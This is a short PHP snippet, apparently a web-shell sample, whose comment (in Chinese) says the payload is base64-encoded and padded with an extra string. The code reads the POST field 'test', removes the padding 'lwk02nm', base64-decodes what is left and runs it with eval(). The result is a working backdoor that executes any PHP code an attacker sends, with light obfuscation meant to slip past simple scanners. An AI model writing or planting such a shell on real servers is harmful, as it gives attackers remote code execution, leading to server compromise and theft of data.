<!-- base64编码并且前后加字符串 -->
<?php 
$st = $_POST['test']; 
$sa = str_replace('lwk02nm','',$st); 
eval(base64_decode($sa)); 
?> 